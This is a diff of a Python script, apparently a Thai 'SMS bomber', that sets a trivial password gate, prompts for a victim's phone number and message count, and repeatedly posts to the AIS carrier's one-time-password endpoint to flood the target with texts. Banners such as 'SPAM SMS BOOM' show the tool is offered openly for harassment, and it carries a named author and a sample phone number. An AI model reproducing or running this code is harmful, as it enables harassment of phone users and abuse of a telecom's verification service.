@@ -7,20 +7,21 @@ from colorama import Fore, Style, init
 os.system("clear")
 os.system("figlet pass")
 p = int(input(Fore.GREEN + "รหัสผ่าน: "))
-if p < 7778:
+if p < 1111:
 	input(Fore.RED + "ใส่รหัสผ่านที่ถูกต้อง")
-if p == 7778:
+if p == 1111:
 	print (Fore.GREEN + "รหัสผ่านถูกต้อง")
-if p > 7778:
+if p > 1111:
 	input(Fore.RED + "ใส่รหัสผ่านไม่ถูกต้อง:")
 time.sleep(1)
 session = requests.Session()
 os.system("clear")
-os.system("figlet spam  sms")
+os.system("figlet SPAM SMS BOOM")
 os.system("neofetch")
-print ("FB:สกล ครับ")
-numbers = input("66นำ:")
-num = int(input("จำนวน:"))
+print ("FB:Sakol Thaneerat")
+print ("ตัวอย่าง 66957435648")
+numbers = input("66นำ: ")
+num = int(input("จำนวน sms : "))
 class SMS():
     def spamais(self,num):
         url = "https://srfng.ais.co.th/login/sendOneTimePW"
@@ -46,7 +47,7 @@ class SMS():
         time.sleep(1)
         send = session.post(url,data=data,headers=headers).json()
         init()
-        print(Fore.YELLOW + "กำลังยิง : " + Fore.RED + str(random.randint(1,100)))
+        print(Fore.YELLOW + "ยิงละ 😎😎😎: " + Fore.RED + str(random.randint(1,10000000)))
 t = SMS()
 def loop(num):
     for i in range(num):
